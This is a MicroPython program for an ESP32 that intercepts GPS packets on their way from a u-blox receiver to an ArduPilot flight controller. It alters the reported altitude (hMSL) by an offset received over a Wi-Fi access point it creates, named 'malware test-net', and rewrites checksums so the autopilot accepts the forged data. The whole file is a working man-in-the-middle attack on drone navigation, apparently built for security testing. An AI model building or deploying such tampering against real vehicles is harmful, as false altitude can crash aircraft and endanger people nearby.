import network
import socket
from machine import UART
import time
from pyubx2 import UBXReader, UBXMessage, SET
from binascii import hexlify
import _thread
import ujson


# DISABLE_NAV_SOL = b'\xb5b\x06\x01\x08\x00\x01\x06\x00\x00\x00\x00\x00\x00\x16\xd5'  # <UBX(CFG-MSG, msgClass=NAV, msgID=NAV-SOL, rateDDC=0, rateUART1=0, rateUART2=0, rateUSB=0, rateSPI=0, reserved=0)>
DISABLE_NAV_SOL = b'\xb5b\x06\x01\x08\x00\x01\x06\x00\x00\x00\x00\x00\x00\x16\xd5'  # For some reason, laptop generates different bytes than esp32
# UBXMessage('CFG', 'CFG-MSG', SET, msgClass=1, msgID=6, rate=0)


def disable_nav_sol(uart_gps):
    reader = UBXReader(uart_gps)
    while True:
        send_uart(uart_gps, DISABLE_NAV_SOL)
        send_uart(uart_gps, DISABLE_NAV_SOL)
        send_uart(uart_gps, DISABLE_NAV_SOL)
        send_uart(uart_gps, DISABLE_NAV_SOL)
        send_uart(uart_gps, DISABLE_NAV_SOL)
        send_uart(uart_gps, DISABLE_NAV_SOL)
        send_uart(uart_gps, DISABLE_NAV_SOL)
        send_uart(uart_gps, DISABLE_NAV_SOL)
        send_uart(uart_gps, DISABLE_NAV_SOL)
        send_uart(uart_gps, DISABLE_NAV_SOL)

        idx = 0
        limit = 5
        for (_, parsed_data) in reader:
            print(parsed_data)
            if idx >= limit:
                break
            if parsed_data.identity == 'ACK-ACK':
                # TODO Let some more come thru to clear out for later hardcoded stuff
                return
            else:
                idx += 1


def modify_pvt_pkt(pkt, transforms):

    transforms.lock.acquire()

    payload_offset = 6

    # pvt_payload = pkt[6:-2]

    # Set fix status and num sats.  Comment after testing.
    # pkt[payload_offset + 20: payload_offset + 21] = int.to_bytes(3, 1, 'little', False)  # Fix 3
    # pkt[payload_offset + 23: payload_offset + 24] = int.to_bytes(12, 1, 'little', False)  # Num Sats 12

    year_bytes = pkt[payload_offset + 4: payload_offset + 6]
    print("Year: " + str(int.from_bytes(year_bytes, 'little', False)))

    h_msl_bytes = pkt[payload_offset + 36: payload_offset + 40]
    print("hMSL: " + str(int.from_bytes(h_msl_bytes, 'little', True)))

    if transforms.h_msl != 0:
        h_msl_bytes = pkt[payload_offset + 36: payload_offset + 40]
        existing_h_msl = int.from_bytes(h_msl_bytes, 'little', True)
        print("Existing hMSL: " + str(existing_h_msl))
        new_h_msl = transforms.h_msl + existing_h_msl
        print("Adding: " + str(transforms.h_msl))
        print("New hMSL: " + str(new_h_msl))
        new_h_msl_bytes = int.to_bytes(new_h_msl, 4, 'little', True)
        pkt[payload_offset + 36: payload_offset + 40] = new_h_msl_bytes
        # TODO CHECK
        # print(str(pkt_h_msl))

    transforms.lock.release()

    ck_a, ck_b = checksum(pkt[2:-2])
    pkt[-2:-1] = ck_a.to_bytes(1, 'big', False)
    pkt[-1:] = ck_b.to_bytes(1, 'big', False)

    return pkt


def checksum(content) -> bytes:  # Stolen from pyubx2
    """
    Calculate checksum using 8-bit Fletcher's algorithm.

    :param bytes content: message content, excluding header and checksum bytes
    :return: checksum
    :rtype: bytes

    """

    check_a = 0
    check_b = 0

    for char in content:
        check_a += char
        check_a &= 0xFF
        check_b += check_a
        check_b &= 0xFF

    return bytes((check_a, check_b))


def recv_gps_pkt(uart_gps):
    data_received = bytearray()

    header = uart_gps.read(2)
    # print("Header: " + str(hexlify(header)))
    if int.from_bytes(header, "big") != 0xb562:
        raise Exception("Header not right, is " + str(header))  # TODO this breaks sometimes
    data_received.extend(header)
    msg_class = uart_gps.read(1)
    # print("Class: " + str(hexlify(msg_class)))
    data_received.extend(msg_class)
    msg_id = uart_gps.read(1)
    # print("ID: " + str(hexlify(msg_id)))
    data_received.extend(msg_id)
    length = uart_gps.read(2)
    data_received.extend(length)
    length = int.from_bytes(length, "little")
    # print("Length: " + str(length))
    payload = uart_gps.read(length)
    data_received.extend(payload)
    checksum = uart_gps.read(2)
    data_received.extend(checksum)
    return data_received


def send_uart(uart_if, raw_data):
    num_written = 0
    while num_written < len(raw_data):
        num_recv = uart_if.write(raw_data[num_written:])
        num_written += num_recv


def worker_thread(transforms):
    listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listen_sock.bind(('10.10.10.1', 8080))
    listen_sock.listen(1)

    while True:
        print("Waiting on connection")
        conn_sock, _ = listen_sock.accept()
        print("Accepted socket")
        
        while True:
            pkt = recv_transform_msg(conn_sock)
            if pkt is None:
                conn_sock.close()
                # TODO zero out transformations
                transforms.lock.acquire()
                transforms.clear()
                print("Cleared transforms")
                transforms.lock.release()
                break

            changes = ujson.loads(pkt.decode('utf-8'))

            transforms.lock.acquire()
            if changes.get("h_msl") is not None:
                transforms.h_msl = int(changes['h_msl'])
                print("h_msl: " + str(transforms.h_msl))
            else:
                pass
                # TODO other transforms

            transforms.lock.release()
            

def recv_transform_msg(conn):
    """
    Return message from laptop
    """

    received = bytearray()
    while len(received) < 2:
        try:
            data = conn.recv(2-len(received))
            received.extend(data)
        except Exception as err:
            raise err
            print(err)
            print("Socket error")
            return None
        if len(data) == 0:
            print("Socket closed")
            return None

    length = int.from_bytes(received, 'big', False)

    received = bytearray()
    while len(received) < length:
        try:
            data = conn.recv(length-len(received))
            received.extend(data)
        except Exception as err:
            print(err)
            print("Socket error")
            return None
        if len(data) == 0:
            print("Socket closed")
            return None
    return bytes(received)


def main():
    time.sleep(2)  # Give time for GPS to boot

    ap = network.WLAN(network.AP_IF)
    ap.ifconfig(('10.10.10.1', '255.255.255.0', '10.10.10.1', '8.8.8.8'))
    ap.config(essid='malware test-net', channel=6)
    ap.config(hidden=False)
    ap.active(False)
    ap.active(True)

    uart_gps = UART(1, 115200)  # Reading from GPS
    uart_gps.init(115200, bits=8, parity=None, stop=1, rx=18, tx=23, timeout=5000, timeout_char=5000)  # 5000ms = 5s, should be find since UBlox sends like 5 times/sec

    uart_ardupilot = UART(2, 115200)  # Writing to board
    uart_ardupilot.init(115200, bits=8, parity=None, stop=1)

    disable_nav_sol(uart_gps)

    transforms = Transforms()

    _thread.start_new_thread(worker_thread, (transforms,))

    num=0
    while True:
        print(num)

        gps_ubx_pkt = recv_gps_pkt(uart_gps)

        if not (gps_ubx_pkt[2] == 1 and gps_ubx_pkt[3] == 7):
            print("Not PVT")
            continue  # Not PVT

        modified_pvt_pkt = modify_pvt_pkt(gps_ubx_pkt, transforms)
        send_uart(uart_ardupilot, modified_pvt_pkt)

        num+=1


class Transforms():
    def __init__(self):
        self.lock = _thread.allocate_lock()
        self.h_msl = 0

    def clear(self):
        self.h_msl = 0


if __name__ == "__main__":
    main()



"""

Program:
- Main thread
    - Init UART interfaces
    - Init network
    - Start worker thread
    - Read PVT
    - Apply any necessary modifications (with mutex) -- add/subtract stored modifications
    - Serialize PVT -- not necessary, just do modifications inline
    - Send to Board
- Worker thread
    - Start socket thread, wait for connection
    - Block until command received
    - Interpret command
    - Save command (with mutex)

"""
